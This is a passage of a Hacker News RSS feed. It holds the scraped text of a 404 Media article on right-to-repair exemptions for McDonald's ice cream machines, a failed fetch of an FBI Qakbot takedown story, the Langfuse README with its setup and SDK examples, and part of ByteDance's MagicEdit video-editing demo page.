work on their own machines. </p><p>In the past, hard-fought exemptions have been won for consumer electronics, tractors, and video game consoles. This year, iFixit and Public Knowledge want to extend an exemption to McDonald’s ice cream machines. In the past, companies like John Deere and lobbying groups like the Entertainment Software Association have tried to kill these exemptions, but groups like iFixit and Public Knowledge have generally been able to push them through the exemption process.</p><p>“The current barriers to these works include service passwords and digital locks,” the petition reads. “Commercial ice cream machines, such as the Taylor manufactured ice cream machines used by McDonald’s, frequently fall into disrepair when its daily pasteurization cycle fails. Circumventing the digital lock on the software would enable owners and repair professionals to diagnose and perform the necessary repairs to get these devices back up and running.”</p><p>A few years ago, I reported that McDonald’s franchises have been <a href="https://www.vice.com/en/article/3aqbm5/mcdonalds-franchises-hack-mcflurry-machines-to-bypass-sanitization-process?ref=404media.co">surreptitiously hacking their ice cream machines</a> to be able to read diagnostic codes without permission from Taylor, which makes the machines. In 2013, Taylor issued a “Service Bulletin” that said unauthorized people had been installing a “shunt” or “jumper” that can bypass arbitrary locks on the machine. </p><figure><iframe width="200" height="113" src="https://www.youtube.com/embed/2uCpY3tFTIA?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="" title="Why McDonald's Ice Cream Machines Are Always Broken and How To Fix Them"></iframe></figure><p>In its Taylor ice cream machine teardown, an iFixit technician says he believes there are several specific issues with the machine that causes it to break down, and which prevent it from being repaired easily.</p><p>“The machine overheats if it’s used too much within a certain time period. This results in mushy goop coming out or the machine shutting down and refusing to work until it resets and cools down,” Shahram Mokhtari, iFixit’s lead teardown tech, said in iFixit’s teardown. The machine gives error codes that explain what’s wrong with the machine: “error after error means I’m constantly having to refer back to the manual … tiny errors can cause big headaches … the error codes are nonsensical, counterintuitive, and seemingly random, even if you spend hours reading the manual.”</p><p>Broken McDonald’s McFlurry machines has become a meme over the years, with the company itself joking about extended downtime, and the Federal Trade Commission promising to investigate <a href="https://www.vice.com/en/article/jg83e4/the-ftc-is-investigating-why-mcdonalds-mcflurry-machines-are-always-broken-report?ref=404media.co">why they are broken so often</a>. But the issue of unreliable, difficult-to-repair McFlurry machines and various associated legal dramas around it could fill out a Bingo card of important right to repair and public access issues in the United States.</p><figure><img src="https://www.404media.co/content/images/2023/08/Screenshot-2023-08-28-at-1.39.53-PM.png" alt="" loading="lazy" width="2000" height="1135" srcset="https://www.404media.co/content/images/size/w600/2023/08/Screenshot-2023-08-28-at-1.39.53-PM.png 600w, https://www.404media.co/content/images/size/w1000/2023/08/Screenshot-2023-08-28-at-1.39.53-PM.png 1000w, https://www.404media.co/content/images/size/w1600/2023/08/Screenshot-2023-08-28-at-1.39.53-PM.png 1600w, https://www.404media.co/content/images/size/w2400/2023/08/Screenshot-2023-08-28-at-1.39.53-PM.png 2400w" sizes="(min-width: 720px) 720px"><figcaption>Downloading court documents for the Kytch lawsuit is $2,999</figcaption></figure><p>A company called Kytch built a small, third-party device that could be attached to the soft service ice cream machines that read and interpreted Taylor’s error codes. Kytch has been engaged <a href="https://www.vice.com/en/article/93ymbp/why-the-mcflurry-machine-company-just-got-hit-with-a-restraining-order?ref=404media.co">in a lawsuit in California state court</a> with Taylor and McDonald’s for <a href="https://www.vice.com/en/article/dy7dbj/judge-allows-mcflurry-machine-repair-lawsuit-to-proceed?ref=404media.co">more than two years</a>. More than 480 documents have been filed with the court in that lawsuit, and a trial is scheduled for this fall. Even reading documents from this lawsuit is a costly nightmare of an affair. The Superior Court of Alameda County is charging roughly $1 per page to get legal filings. To download the entirety of the court proceedings to date, the court wants $2,999.</p><!--kg-card-begin: html-->
<!--kg-card-end: html--><!--kg-card-begin: html--><!--kg-card-end: html-->
          </div>
        </article>
      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[FBI, Partners Dismantle Qakbot Infrastructure in Multinational Cyber Takedown (224 pts)]]></title>
            <link>https://www.fbi.gov/news/stories/fbi-partners-dismantle-qakbot-infrastructure-in-multinational-cyber-takedown</link>
            <guid>37310772</guid>
            <pubDate>Tue, 29 Aug 2023 17:02:49 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.fbi.gov/news/stories/fbi-partners-dismantle-qakbot-infrastructure-in-multinational-cyber-takedown">https://www.fbi.gov/news/stories/fbi-partners-dismantle-qakbot-infrastructure-in-multinational-cyber-takedown</a>, See on <a href="https://news.ycombinator.com/item?id=37310772">Hacker News</a></p>
Couldn't get https://www.fbi.gov/news/stories/fbi-partners-dismantle-qakbot-infrastructure-in-multinational-cyber-takedown: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Langfuse – Open-source observability and analytics for LLM apps (129 pts)]]></title>
            <link>https://github.com/langfuse/langfuse</link>
            <guid>37310070</guid>
            <pubDate>Tue, 29 Aug 2023 16:14:06 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/langfuse/langfuse">https://github.com/langfuse/langfuse</a>, See on <a href="https://news.ycombinator.com/item?id=37310070">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-target="readme-toc.content">
            <article itemprop="text">
<h2 tabindex="-1" dir="auto">What is Langfuse?</h2>
<p dir="auto">Langfuse is an open source observability &amp; analytics solution for LLM-based applications. It is mostly geared towards production usage but some users also use it for local development of their LLM applications.</p>
<p dir="auto">Langfuse is focused on applications built on top of LLMs. Many new abstractions and common best practices evolved recently, e.g. agents, chained prompts, embedding-based retrieval, LLM access to REPLs &amp; APIs. These make applications more powerful but also unpredictable for developers as they cannot fully anticipate how changes impact the quality, cost and overall latency of their application. Thus Langfuse helps to monitor and debug these applications.</p>
<p dir="auto"><strong>Demo (2 min)</strong></p>
<details open="">
  <summary>
    
    <span aria-label="Video description langfuse_demo_2_min.mp4">langfuse_demo_2_min.mp4</span>
    <span></span>
  </summary>

  <video src="https://user-images.githubusercontent.com/2834609/262364670-6041347a-b517-4a11-8737-93ef8f8af49f.mp4" data-canonical-src="https://user-images.githubusercontent.com/2834609/262364670-6041347a-b517-4a11-8737-93ef8f8af49f.mp4" controls="controls" muted="muted">

  </video>
</details>

<p dir="auto"><em>Muted by default, enable sound for voice-over</em></p>
<p dir="auto">Explore demo project in Langfuse here (free account required): <a href="https://langfuse.com/demo" rel="nofollow">https://langfuse.com/demo</a></p>
<h3 tabindex="-1" dir="auto">Observability</h3>
<p dir="auto">Langfuse offers an admin UI to explore the ingested data.</p>
<ul dir="auto">
<li>Nested view of LLM app executions; detailed information along the traces on: latency, cost, scores</li>
<li>Segment execution traces by user feedback, to e.g. identify production issues</li>
</ul>
<h3 tabindex="-1" dir="auto">Analytics</h3>
<p dir="auto">Reporting on</p>
<ul dir="auto">
<li>Token usage by model</li>
<li>Volume of traces</li>
<li>Scores/evals</li>
</ul>
<p dir="auto">Broken down by</p>
<ul dir="auto">
<li>Users</li>
<li>Releases</li>
<li>Prompt/chain versions</li>
<li>Prompt/chain types</li>
<li>Time</li>
</ul>
<p dir="auto">→ Expect releases with more ways to analyze the data over the next weeks.</p>
<h2 tabindex="-1" dir="auto">Get started</h2>
<h3 tabindex="-1" dir="auto">Step 1: Run Server</h3>
<h4 tabindex="-1" dir="auto">Langfuse Cloud</h4>
<p dir="auto">Managed deployment by the Langfuse team, generous free-tier (hobby plan) available, no credit card required.</p>
<p dir="auto">Links: <a href="https://cloud.langfuse.com/" rel="nofollow">Create account</a>, <a href="https://cloud.langfuse.com/" rel="nofollow">learn more</a></p>
<h4 tabindex="-1" dir="auto">Localhost</h4>
<p dir="auto">Requirements: Docker, Node.js &gt;=18, npm</p>
<div dir="auto" data-snippet-clipboard-copy-content="# Clone repository
git clone git@github.com:langfuse/langfuse.git
cd langfuse

# Run server and database
docker compose up -d

# Apply db migrations
DATABASE_URL=postgresql://postgres:postgres@localhost:5432/postgres DIRECT_URL=postgresql://postgres:postgres@localhost:5432/postgres npx prisma migrate deploy"><pre><span><span>#</span> Clone repository</span>
git clone git@github.com:langfuse/langfuse.git
<span>cd</span> langfuse

<span><span>#</span> Run server and database</span>
docker compose up -d

<span><span>#</span> Apply db migrations</span>
DATABASE_URL=postgresql://postgres:postgres@localhost:5432/postgres DIRECT_URL=postgresql://postgres:postgres@localhost:5432/postgres npx prisma migrate deploy</pre></div>
<h4 tabindex="-1" dir="auto">Self-host (Docker)</h4>
<p dir="auto"><a href="https://langfuse.com/docs/deployment/self-host" rel="nofollow">→ Instructions</a></p>
<h3 tabindex="-1" dir="auto">Step 2: Data ingestion</h3>
<h4 tabindex="-1" dir="auto">Langchain applications</h4>
<p dir="auto">The Langfuse callback handler automatically instruments Langchain applications. Currently available for Python, JS/TS support is in progress (add +1 to issue <a href="https://github.com/langfuse/langfuse-js/issues/11" data-hovercard-type="issue" data-hovercard-url="/langfuse/langfuse-js/issues/11/hovercard">here</a>).</p>

<div dir="auto" data-snippet-clipboard-copy-content="# Initialize Langfuse handler
from langfuse.callback import CallbackHandler
handler = CallbackHandler(PUBLIC_KEY, SECRET_KEY)

# Setup Langchain
from langchain.chains import LLMChain
...
chain = LLMChain(llm=llm, prompt=prompt)

# Add Langfuse handler as callback
chain.run(input=&quot;<user_input&quot;, callbacks=[handler])"><pre><span># Initialize Langfuse handler</span>
<span>from</span> <span>langfuse</span>.<span>callback</span> <span>import</span> <span>CallbackHandler</span>
<span>handler</span> <span>=</span> <span>CallbackHandler</span>(<span>PUBLIC_KEY</span>, <span>SECRET_KEY</span>)

<span># Setup Langchain</span>
<span>from</span> <span>langchain</span>.<span>chains</span> <span>import</span> <span>LLMChain</span>
...
<span>chain</span> <span>=</span> <span>LLMChain</span>(<span>llm</span><span>=</span><span>llm</span>, <span>prompt</span><span>=</span><span>prompt</span>)

<span># Add Langfuse handler as callback</span>
<span>chain</span>.<span>run</span>(<span>input</span><span>=</span><span>"&lt;user_input"</span>, <span>callbacks</span><span>=</span>[<span>handler</span>])</pre></div>
<p dir="auto">→ More details: <a href="https://langfuse.com/docs/integrations/langchain" rel="nofollow">Langchain integration docs</a></p>
<h4 tabindex="-1" dir="auto">SDKs to manually instrument application</h4>
<p dir="auto">Fully async, typed SDKs to instrument any LLM application. Currently available for Python &amp; JS/TS.</p>
<p dir="auto">→ <a href="https://langfuse.com/docs/guides/sdk-integration" rel="nofollow">Guide</a> with an example of how the SDK can be used</p>
<table>
<thead>
<tr>
<th>Package</th>
<th>Description</th>
<th>Links</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://pypi.python.org/pypi/langfuse" rel="nofollow"><img src="https://camo.githubusercontent.com/35f545eed9704ceba9160fd407a46893f771ab0b358052aa92f7e20a335090f3/68747470733a2f2f696d672e736869656c64732e696f2f707970692f762f6c616e67667573652e7376673f7374796c653d666c61742d737175617265266c6162656c3d707970692b6c616e6766757365" alt="PyPI Version" data-canonical-src="https://img.shields.io/pypi/v/langfuse.svg?style=flat-square&amp;label=pypi+langfuse"></a></td>
<td>Python</td>
<td><a href="https://langfuse.com/docs/integrations/sdk/python" rel="nofollow">docs</a>, <a href="https://github.com/langfuse/langfuse-python">repo</a></td>
</tr>
<tr>
<td><a href="https://www.npmjs.com/package/langfuse" rel="nofollow"><img src="https://camo.githubusercontent.com/56f6fae5a3ffa4a875835020fb76b0dbcecc98d7c1c3135693f3ba9880e32934/68747470733a2f2f696d672e736869656c64732e696f2f6e706d2f762f6c616e67667573653f7374796c653d666c61742d737175617265266c6162656c3d6e706d2b6c616e6766757365" alt="npm Version" data-canonical-src="https://img.shields.io/npm/v/langfuse?style=flat-square&amp;label=npm+langfuse"></a></td>
<td>JS/TS: Node &gt;= 18, Edge runtimes</td>
<td><a href="https://langfuse.com/docs/integrations/sdk/typescript" rel="nofollow">docs</a>, <a href="https://github.com/langfuse/langfuse-js">repo</a></td>
</tr>
<tr>
<td><a href="https://www.npmjs.com/package/langfuse-node" rel="nofollow"><img src="https://camo.githubusercontent.com/e5eaf21f8683e99f9bbf82d59cb7e99dbb0847fdbf013b09857ec449e3f48617/68747470733a2f2f696d672e736869656c64732e696f2f6e706d2f762f6c616e67667573652d6e6f64653f7374796c653d666c61742d737175617265266c6162656c3d6e706d2b6c616e67667573652d6e6f6465" alt="npm package" data-canonical-src="https://img.shields.io/npm/v/langfuse-node?style=flat-square&amp;label=npm+langfuse-node"></a></td>
<td>JS/TS: Node &lt;18</td>
<td><a href="https://langfuse.com/docs/integrations/sdk/typescript" rel="nofollow">docs</a>, <a href="https://github.com/langfuse/langfuse-js">repo</a></td>
</tr>
</tbody>
</table>
<h3 tabindex="-1" dir="auto">Add scores/evaluations to traces (optional)</h3>
<p dir="auto">Quality/evaluation of traces is tracked via scores (<a href="https://langfuse.com/docs/scores" rel="nofollow">docs</a>). Scores are related to traces and optionally to observations. Scores can be added via:</p>
<ul dir="auto">
<li>
<p dir="auto"><strong>Backend SDKs</strong> (see docs above): <code>{trace, event, span, generation}.score()</code></p>
</li>
<li>
<p dir="auto"><strong>API</strong> (see docs below): <code>POST /api/public/scores</code></p>
</li>
<li>
<p dir="auto"><strong>Client-side using Web SDK</strong>, e.g. to capture user feedback or other user-based quality metrics:</p>

<div dir="auto" data-snippet-clipboard-copy-content="// Client-side (browser)

import { LangfuseWeb } from &quot;langfuse&quot;;

const langfuseWeb = new LangfuseWeb({
  publicKey: process.env.LANGFUSE_PUBLIC_KEY,
});

// frontend handler (example: React)
export function UserFeedbackComponent(props: { traceId: string }) {
  const handleUserFeedback = async (value: number) => {
    await langfuseWeb.score({
      traceId: props.traceId,
      name: &quot;user_feedback&quot;,
      value,
    });
  };
  return (
    <div>
      <button onClick={() => handleUserFeedback(1)}>👍</button>
      <button onClick={() => handleUserFeedback(-1)}>👎</button>
    </div>
  );
}"><pre><span>// Client-side (browser)</span>

<span>import</span> <span>{</span> <span>LangfuseWeb</span> <span>}</span> <span>from</span> <span>"langfuse"</span><span>;</span>

<span>const</span> <span>langfuseWeb</span> <span>=</span> <span>new</span> <span>LangfuseWeb</span><span>(</span><span>{</span>
  <span>publicKey</span>: <span>process</span><span>.</span><span>env</span><span>.</span><span>LANGFUSE_PUBLIC_KEY</span><span>,</span>
<span>}</span><span>)</span><span>;</span>

<span>// frontend handler (example: React)</span>
<span>export</span> <span>function</span> <span>UserFeedbackComponent</span><span>(</span><span>props</span>: <span>{</span> <span>traceId</span>: <span>string</span> <span>}</span><span>)</span> <span>{</span>
  <span>const</span> <span>handleUserFeedback</span> <span>=</span> <span>async</span> <span>(</span><span>value</span>: <span>number</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>await</span> <span>langfuseWeb</span><span>.</span><span>score</span><span>(</span><span>{</span>
      <span>traceId</span>: <span>props</span><span>.</span><span>traceId</span><span>,</span>
      <span>name</span>: <span>"user_feedback"</span><span>,</span>
      value<span>,</span>
    <span>}</span><span>)</span><span>;</span>
  <span>}</span><span>;</span>
  <span>return</span> <span>(</span>
    <span>&lt;</span><span>div</span><span>&gt;</span>
      <span>&lt;</span><span>button</span> <span>onClick</span><span>=</span><span>{</span><span>(</span><span>)</span> <span>=&gt;</span> <span>handleUserFeedback</span><span>(</span><span>1</span><span>)</span><span>}</span><span>&gt;</span><span>👍</span><span>&lt;</span><span><span>/</span>button&gt;</span><span></span>
      <span>&lt;</span><span>button</span> <span>onClick</span><span>=</span><span>{</span><span>(</span><span>)</span> <span>=&gt;</span> <span>handleUserFeedback</span><span>(</span><span>-</span><span>1</span><span>)</span><span>}</span><span>&gt;</span><span>👎</span><span>&lt;</span><span><span>/</span>button&gt;</span>
<span>    <span>&lt;</span><span>/</span>div</span><span>&gt;</span><span></span>
  <span>)</span><span>;</span>
<span>}</span></pre></div>
</li>
</ul>
<h4 tabindex="-1" dir="auto">API</h4>
<p dir="auto"><a href="https://langfuse.com/docs/integrations/api" rel="nofollow"><strong>Api reference</strong></a></p>
<ul dir="auto">
<li>POST/PATCH routes to ingest data</li>
<li>GET routes to use data in downstream applications (e.g. embedded analytics)</li>
</ul>
<h2 tabindex="-1" dir="auto">Questions / Feedback</h2>
<p dir="auto">The maintainers are very active in the Langfuse <a href="https://langfuse.com/discord" rel="nofollow">Discord</a> and are happy to answer questions or discuss feedback/ideas regarding the future of the project.</p>
<h2 tabindex="-1" dir="auto">Contributing to Langfuse</h2>
<p dir="auto">Join the community <a href="https://discord.gg/7NXusRtqYU" rel="nofollow">on Discord</a>.</p>
<p dir="auto">To contribute, send us a PR, raise a github issue, or email at <a href="mailto:contributing@langfuse.com">contributing@langfuse.com</a></p>
<h3 tabindex="-1" dir="auto">Development setup</h3>
<p dir="auto">Requirements: Node.js &gt;=18, npm, Docker</p>
<div dir="auto" data-snippet-clipboard-copy-content="# Install dependencies
npm install

# Run the db
docker-compose -f docker-compose.dev.yml up -d

# create an env file
cp .env.dev.example .env

# Migration
npm run db:migrate

# Optional: seed the database
# npm run db:seed
# npm run db:seed:examples

# Start the server
npm run dev"><pre><span><span>#</span> Install dependencies</span>
npm install

<span><span>#</span> Run the db</span>
docker-compose -f docker-compose.dev.yml up -d

<span><span>#</span> create an env file</span>
cp .env.dev.example .env

<span><span>#</span> Migration</span>
npm run db:migrate

<span><span>#</span> Optional: seed the database</span>
<span><span>#</span> npm run db:seed</span>
<span><span>#</span> npm run db:seed:examples</span>

<span><span>#</span> Start the server</span>
npm run dev</pre></div>
<h2 tabindex="-1" dir="auto">License</h2>
<p dir="auto">Langfuse is MIT licensed, except for <code>ee/</code> folder. See <a href="https://github.com/langfuse/langfuse/blob/main/LICENSE">LICENSE</a> and <a href="https://langfuse.com/docs/open-source" rel="nofollow">docs</a> for more details.</p>
<h2 tabindex="-1" dir="auto">Misc</h2>
<h3 tabindex="-1" dir="auto">Upgrade Langfuse (localhost)</h3>
<div dir="auto" data-snippet-clipboard-copy-content="# Stop server and db
docker compose down

# Pull latest changes
git pull
docker-compose pull

# Run server and db
docker compose up -d

# Apply db migrations
DATABASE_URL=postgresql://postgres:postgres@localhost:5432/postgres DIRECT_URL=postgresql://postgres:postgres@localhost:5432/postgres npx prisma migrate deploy"><pre><span><span>#</span> Stop server and db</span>
docker compose down

<span><span>#</span> Pull latest changes</span>
git pull
docker-compose pull

<span><span>#</span> Run server and db</span>
docker compose up -d

<span><span>#</span> Apply db migrations</span>
DATABASE_URL=postgresql://postgres:postgres@localhost:5432/postgres DIRECT_URL=postgresql://postgres:postgres@localhost:5432/postgres npx prisma migrate deploy</pre></div>
<h3 tabindex="-1" dir="auto">Run Langfuse in CI for integration tests</h3>
<p dir="auto">Checkout GitHub Actions workflows of <a href="https://github.com/langfuse/langfuse-python/blob/main/.github/workflows/ci.yml">Python SDK</a> and <a href="https://github.com/langfuse/langfuse-js/blob/main/.github/workflows/ci.yml">JS/TS SDK</a>.</p>
</article>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[MagicEdit: High-Fidelity Temporally Coherent Video Editing (235 pts)]]></title>
            <link>https://magic-edit.github.io/</link>
            <guid>37309818</guid>
            <pubDate>Tue, 29 Aug 2023 15:57:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://magic-edit.github.io/">https://magic-edit.github.io/</a>, See on <a href="https://news.ycombinator.com/item?id=37309818">Hacker News</a></p>
<div id="readability-page-1" class="page">



<div>
        <h2>
          MagicEdit:
        </h2>
        <h3>
          High-Fidelity Temporally Coherent Video Editing
        </h3>
        

        <p><span>ByteDance Inc.</span>
          <span>&nbsp;&nbsp;<sup>*</sup>Equal Contribution</span>
        </p>

        
    </div>

<div>
        

      <p>
      <h2>
        <b>MagicEdit</b> explicitly disentangles the learning of appearance and motion to achieve high-fidelity and temporally coherent video editing.  
        It supports various editing applications, including video stylization, local editing, video-MagicMix and video outpainting. 
      </h2>
    </p>
  </div>

<div>
    <h2>Video stylization</h2>
    <p>
      Video stylization enables one to (1) transform the source video into a new video with a style-of-
      interest (e.g., realistic, cartoon), or (2) creating a new scene with different subject (e.g., dog → cat) 
      and different background (e.g., living room → beach).
    </p>

    <hr>
    <center>
      <h2><b>▶ </b> Animals</h2>
    </center>
    <hr>

    <table>
      <tbody><tr>
        <td>
          
        </td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/animals/sample_2_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/animals/sample_3_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>Source video</td>
          <td></td>
          <td>"a monkey, playing on the coast, sea"</td>
          <td></td>
          <td>"a teddy bear, eating apple, green grassland with flowers"</td>
        </tr>
      </tbody></table>
    </center>

    <table>
      <tbody><tr>
        <td>
          
        </td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/animals/sample_8_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/animals/sample_9_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>Source video</td>
          <td></td>
          <td>"a cute cat, sitting on the ground"</td>
          <td></td>
          <td>"a labrador dog, sitting on the table"</td>          
        </tr>
      </tbody></table>
    </center>

    <table>
      <tbody><tr>
        <td>
          
        </td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/animals/sample_0_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/animals/sample_1_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>Source video</td>
          <td></td>
          <td>"a husky dog, lying on the sands"</td>
          <td></td>
          <td>"a sea lion, lying on the ice, winter, snow"</td>
        </tr>
      </tbody></table>
    </center>

    <hr>
    <center>
      <h2><b>▶ </b> Objects</h2>
    </center>
    <hr>

    <table>
      <tbody><tr>
        <td>
          
        </td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/objects/sample_2_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/objects/sample_1_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>Source video</td>
          <td></td>
          <td>"a red car, moving on the road, autumn, maple leaves"</td>
          <td></td>
          <td>"a red car, moving on the road, mountain, green grass and trees"</td>          
        </tr>
      </tbody></table>
    </center>

    <table>
      <tbody><tr>
        <td>
          
        </td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/objects/sample_5_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/objects/sample_6_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>Source video</td>
          <td></td>
          <td>"black and white biscuits, falling down sequentially"</td>
          <td></td>
          <td>"bricks, falling down sequentially"</td>
        </tr>
      </tbody></table>
    </center>
      
    <table>
      <tbody><tr>
        <td>
          
        </td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/objects/sample_7_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/objects/sample_8_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>Source video</td>
          <td></td>
          <td>"stools, moving on the railway track"</td>
          <td></td>
          <td>"white cupcakes, moving on the table"</td>
        </tr>
      </tbody></table>
    </center>

    <hr>
    <center>
      <h2><b>▶ </b> Scenes</h2>
      <!-- <p>
        xxx
      </p> -->
    </center>
    <hr>

    <table>
      <tbody><tr>
        <td>
          
        </td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/scenes/sample_0_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/scenes/sample_1_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>Source video</td>
          <td></td>
          <td>"boats and buildings, floating in the space, stars"</td>
          <td></td>
          <td>"boats, floating on the sea, villas on the coastal"</td>
        </tr>
      </tbody></table>
    </center>

    <table>
      <tbody><tr>
        <td>
          
        </td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/scenes/sample_2_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/scenes/sample_3_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>Source video</td>
          <td></td>
          <td>"a submarine travelling in the sea, fish swimming"</td>
          <td></td>
          <td>"motorbike travelling in the tunnel, with graffiti on the wall"</td>
        </tr>
      </tbody></table>
    </center>

    <table>
      <tbody><tr>
        <td>
          
        </td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/scenes/sample_6_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/scenes/sample_7_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>Source video</td>
          <td></td>
          <td>"red train travelling, snow, winter"</td>
          <td></td>
          <td>"train travelling, japanese, Cherry blossoms"</td>
        </tr>
      </tbody></table>
    </center>

    <hr>
    <center>
      <h2><b>▶ </b> Human</h2>
      <!-- <p>
        xxx
      </p> -->
    </center>
    <hr>

    <table>
      <tbody><tr>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/humans/sample_1_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/humans/sample_1_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/humans/sample_2_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/humans/sample_2_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/humans/sample_3_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/humans/sample_3_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>Source video</td>
          <td></td>
          <td>"a pretty girl, pink dress, living room"</td>
          <td></td>
          <td>Source video</td>
          <td></td>
          <td>"a pretty girl, white dress, dark hair, flowers"</td>
          <td></td>
          <td>Source video</td>
          <td></td>
          <td>"a pretty girl, white singlet, dark pants, on the stage"</td>
        </tr>
      </tbody></table>
    </center>

    <table>
      <tbody><tr>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/humans/sample_5_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/humans/sample_5_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/humans/sample_6_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/humans/sample_6_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/humans/sample_4_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/humans/sample_4_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>Source video</td>
          <td></td>
          <td>"a pretty girl, yellow dress, beach, coconut trees"</td>
          <td></td>
          <td>Source video</td>
          <td></td>
          <td>"a pretty girl, red dress, ballroom"</td>
          <td></td>
          <td>Source video</td>
          <td></td>
          <td>"a pretty girl, white dress, dark hair"</td>
        </tr>
      </tbody></table>
    </center>

  <hr>
  <div>
    <h2>Local editing</h2>
    <p>
      MagicEdit also allows users to make local modification to the video while leaving other regions untouched 
      (e.g., make the young lady wear glasses).
    </p>
    <hr>

    <table>
      <tbody><tr>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/local/sample_1_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/local/sample_1_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/local/sample_2_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/local/sample_2_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/local/sample_3_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/local/sample_3_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>Source video</td>
          <td></td>
          <td>"a handsome man"</td>
          <td></td>
          <td>Source video</td>
          <td></td>
          <td>"wearing sunglasses"</td>
          <td></td>
          <td>Source video</td>
          <td></td>
          <td>"a handsome man"</td>
        </tr>
      </tbody></table>
    </center>

    <table>
      <tbody><tr>
